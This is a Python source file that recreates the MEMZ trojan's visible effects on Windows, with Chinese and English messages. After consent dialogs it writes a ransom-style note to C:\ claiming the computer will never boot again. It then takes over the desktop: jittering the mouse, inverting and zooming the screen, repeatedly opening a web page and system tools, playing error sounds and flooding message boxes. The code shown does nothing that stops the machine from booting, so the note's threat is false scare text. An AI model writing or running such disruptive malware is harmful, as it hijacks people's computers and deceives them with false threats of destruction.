from win32gui import MessageBox, GetWindowDC, GetWindowRect, BitBlt, GetDesktopWindow, PostMessage, DrawIcon, LoadIcon, GetWindowText, DeleteObject, ReleaseDC, SetWindowText, EnumWindows, EnumChildWindows, FindWindow, SetWindowPos
from win32api import GetMonitorInfo, MonitorFromWindow
from win32ui import CreateDCFromHandle, CreateBitmap
from win32con import MB_OK, MB_ICONWARNING, DSTINVERT, IDI_ERROR, IDI_WARNING, SRCCOPY, SWP_SHOWWINDOW, HWND_NOTOPMOST
from winsound import PlaySound, SND_FILENAME, SND_ASYNC
from random import randint
from _thread import start_new_thread as startThread
from time import sleep, time
from ctypes import windll
from pyautogui import move, size, position
from os import system
from webbrowser import open as webopen


warn_in_start1 = ""
warn_in_start2 = ""
note = ""
tip_for_using = ""
run = True
SPI_SETINVERTED = 0x005D
SPIF_SENDCHANGE = 0x02
move_target = 1
Chinese = True
rand_win_speed1 = 40
rand_win_speed2 = 60
time_tunnel_speed = 2.0
close_warnings = []


def main():
    step_of_language()
    if not step0():
        return
    step1()
    step2()
    step3()
    step4()
    step5()
    step6()
    step7()
    step_for_boom()


def step_of_language():
    global warn_in_start1
    global warn_in_start2
    global note
    global tip_for_using
    global close_warnings
    if Chinese:
        warn_in_start1 = """\
你刚刚执行的这个软件被认为是一个恶意软件，这个恶意软件会破坏你的电脑并使它无法使用。
如果你在不知道你刚刚执行了什么的情况下看到了这个弹窗,简单的点一下取消然后什么都不会发生。
如果你知道它是干什么的,而且打开了一个杀毒软件去试验它,点击确定或点击关闭启动它。
你确定要启动这个软件,并得到一台无法使用的机器吗?"""
        warn_in_start2 = """\
这是最后一次提醒了，制作者不会对该软件造成的任何损失负责。
还要启动它吗?"""
        note = """\
您的计算机已被MEMZ木马duang掉了。

您的计算机无法再次启动了，
所以尽你所能地使用它尽可能长的时间！

:D

试图杀死 MEMZ 进程将导致您的系统
立即崩溃，所以不要尝试:D"""
        tip_for_using = "还在使用这台电脑吗?"
        close_warnings = ["REST IN PISS, FOREVER MISS.",
                          "<Insert Joel quote here>",
                          "HAHA NOOB L2P G3T R3KT",
                          "Well, hello there.1 don't believe we've been properly introduced.I'mBonzi!",
                          "ENJOY THE NYAN CAT",
                          "I WARNED YOU..."]
    else:
        note = """\
YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.

Your computer won't boot up again,
so use it as long as you can!

:D

Trying to kill MEMZ will cause your system to be
destroyed instantly, so don't try it :D"""
        tip_for_using = "Still using this computer?"


def step0():
    choose = show_warm_yesno("MEMZ", warn_in_start1)
    if choose == 2:
        return False
    choose = show_warm_yesno("MEMZ", warn_in_start2)
    if choose == 2:
        return False
    return True


def step1():
    f = open(r"C:\note.txt", "w+")
    f.write(note)
    f.close()
    startThread(system, (r'notepad "C:\note.txt"',))
    sleep(40)


def step2():
    startThread(html_open_thread, ())
    startThread(sound_play_thread, (28, 7.5, 8.5))
    startThread(mouse_move_thread, ())
    sleep(28)


def step3():
    global move_target
    system("control")
    startThread(rand_winopen_thread, ())
    startThread(sound_play_thread, (1e6, 0.2, 0.3))
    move_target = 2
    sleep(16)


def step4():
    global move_target
    startThread(tips_thread, ())
    startThread(invert_desktop_thread, ())
    move_target = 3
    sleep(30)


def step5():  # 出现错误图标,标题开始反转
    set_rand_win_speed(5, 15)
    startThread(draw_icon_thread, ())
    sleep(25)
    # startThread(reverse_tilite_thread, ())
    sleep(35)


def step6():
    global move_target
    move_target = 5
    startThread(space_time_tunnel_thread, ())
    sleep(60)


def step7():
    global run
    global close_warnings
    for i in range(50):
        show_warning(
            str(i+1), close_warnings[randint(0, len(close_warnings)-1)], True)
        try:
            set_tips_pos(str(i+1))
        except:
            pass
    run = False
    sleep(0.3)


def step_for_boom():
    import cat_window


def mouse_move_thread():
    while run:
        try:
            move(randint(0-move_target, move_target),
                 randint(0-move_target, move_target))
        except:
            pass


def html_open_thread():
    while run:
        sleep(randint(110, 150)/10)
        webopen("https://www.scratch-cn.cn/user/project?comid=617f65d14056590f74cb704b")


def sound_play_thread(t: int, wait1: float, wait2: float):
    sound_list = [r"C:\Windows\Media\Windows Shutdown.wav",
                  r"C:\Windows\Media\Windows Error.wav",
                  r"C:\Windows\Media\Windows Exclamation.wav",
                  r"C:\Windows\Media\Windows Ding.wav",
                  r"C:\Windows\Media\Windows Critical Stop.wav"]
    timer = time()
    while timer+t > time():
        startThread(PlaySound,
                    (sound_list[randint(0, len(sound_list)-1)],
                     SND_FILENAME | SND_ASYNC))
        sleep(randint(int(wait1*100), int(wait2*100))/100)


def invert_desktop_thread():
    while run:
        invert_desktop()
        sleep(0.8)


def tips_thread():
    sleep(20)
    while run:
        show_warning("MEMZ", tip_for_using)
        sleep(10)


def draw_icon_thread():
    hwnd = GetDesktopWindow()
    hdc = GetWindowDC(hwnd)
    icon_names = [IDI_ERROR, IDI_WARNING]
    images = []
    for icon_name in icon_names:
        images.append(LoadIcon(0, icon_name))

    def draw_icon_desktop_thread(hdc: int, images: list):
        desktop_size = size()
        while run:
            DrawIcon(hdc,
                     randint(0, desktop_size[0]),
                     randint(0, desktop_size[1]),
                     images[randint(0, 1)])
            sleep(0.4)

    startThread(draw_icon_desktop_thread, (hdc, images))
    while run:
        DrawIcon(hdc,
                 position()[0],
                 position()[1],
                 images[0])
        sleep(0.05)


def reverse_tilite_thread():
    while run:
        reverse_tilite()
        sleep(1)
        reverse_tilite()
        sleep(1)


def space_time_tunnel_thread():
    global time_tunnel_speed
    while run:
        scale_and_draw(0.93)
        sleep(time_tunnel_speed)
        if time_tunnel_speed > 0.02:
            time_tunnel_speed *= 0.96


def rand_winopen_thread():
    windows = ["cmd", "control", "notepad", "msconfig", "write"]
    while run:
        system(windows[randint(0, len(windows)-1)])
        sleep(randint(rand_win_speed1*10, rand_win_speed2*10)/10)


def set_tips_pos(tilite: str):
    hwnd = FindWindow(None, tilite)
    screen_size = size()
    rect = GetWindowRect(hwnd)
    SetWindowPos(hwnd,
                 HWND_NOTOPMOST,
                 randint(0, screen_size[0]-(rect[2]-rect[0])),
                 randint(0, screen_size[1]-(rect[3]-rect[1])),
                 rect[2]-rect[0],
                 rect[3]-rect[1],
                 SWP_SHOWWINDOW)
    SetWindowText(hwnd, "MEMZ")  # type: ignore


def set_rand_win_speed(num1: float, num2: float):
    global rand_win_speed1
    global rand_win_speed2
    rand_win_speed1 = num1
    rand_win_speed2 = num2


def scale_and_draw(center_scale: float):
    # 获取当前屏幕的相关信息
    hdesktop = GetDesktopWindow()
    desktop_dc = GetWindowDC(hdesktop)
    monitor_info = GetMonitorInfo(MonitorFromWindow(hdesktop))
    monitor_width = monitor_info['Monitor'][2] - monitor_info['Monitor'][0]
    monitor_height = monitor_info['Monitor'][3] - monitor_info['Monitor'][1]

    # 创建一个设备上下文
    dc = CreateDCFromHandle(desktop_dc)

    # 创建一个内存设备上下文，用于缩放和绘制
    mem_dc = dc.CreateCompatibleDC()

    # 创建一个位图对象，用于存储原始屏幕内容
    bmp = CreateBitmap()
    bmp.CreateCompatibleBitmap(dc, monitor_width, monitor_height)
    mem_dc.SelectObject(bmp)

    # 将屏幕内容绘制到位图对象中
    mem_dc.BitBlt((0, 0), (monitor_width, monitor_height), dc, (0, 0), SRCCOPY)

    # 计算缩放后的画布大小和位置
    scaled_width = int(monitor_width * center_scale)
    scaled_height = int(monitor_height * center_scale)
    scaled_x = (monitor_width - scaled_width) // 2
    scaled_y = (monitor_height - scaled_height) // 2

    # 创建一个新的位图对象，用于存储缩放后的内容
    scaled_bmp = CreateBitmap()
    scaled_bmp.CreateCompatibleBitmap(dc, scaled_width, scaled_height)

    # 在缩放后的位图上进行绘制
    mem_dc_scaled = mem_dc.CreateCompatibleDC()
    mem_dc_scaled.SelectObject(scaled_bmp)
    mem_dc_scaled.StretchBlt((0, 0), (scaled_width, scaled_height),
                             mem_dc, (0, 0), (monitor_width, monitor_height), SRCCOPY)

    # 将缩放后的内容绘制到屏幕中央
    dc.StretchBlt((scaled_x, scaled_y), (scaled_width, scaled_height),
                  mem_dc_scaled, (0, 0), (scaled_width, scaled_height), SRCCOPY)

    # 清理资源
    dc.DeleteDC()
    mem_dc.DeleteDC()
    mem_dc_scaled.DeleteDC()
    ReleaseDC(hdesktop, desktop_dc)
    DeleteObject(bmp.GetHandle())
    DeleteObject(scaled_bmp.GetHandle())


def reverse_tilite():
    def reverse_tilite_for_one(hwnd):
        tilite = GetWindowText(hwnd)
        tilite = list(tilite)
        tilite.reverse()
        tilite = "".join(tilite)
        SetWindowText(hwnd, tilite)  # type: ignore

    hwndList = []
    hwnd_child_list = []
    EnumWindows(lambda hWnd, param: param.append(hWnd),
                hwndList)  # 获取窗口句柄列表
    for hwnd in hwndList:
        reverse_tilite_for_one(hwnd)
        hwnd_child_list.clear()
        EnumChildWindows(hwnd,
                         lambda hwnd, param: param.append(hwnd),
                         hwnd_child_list)  # 获取子控件句柄列表

        for ChildHwnd in hwnd_child_list:
            reverse_tilite_for_one(ChildHwnd)


def invert_desktop():
    hWnd = GetDesktopWindow()
    hdc = GetWindowDC(hWnd)
    rect = GetWindowRect(hWnd)
    BitBlt(hdc, 0, 0, rect[2],
           rect[3], hdc, rect[0], rect[1], DSTINVERT)


def show_warning(title: str, message: str, not_wait: bool = False):
    if not_wait:
        startThread(MessageBox, (0, message, title, MB_OK | MB_ICONWARNING))
        sleep(0.04)
    else:
        MessageBox(0, message, title, MB_OK | MB_ICONWARNING)


def show_warm_yesno(title: str, message: str):
    return windll.user32.MessageBoxW(0, message, title, 1 | 48)

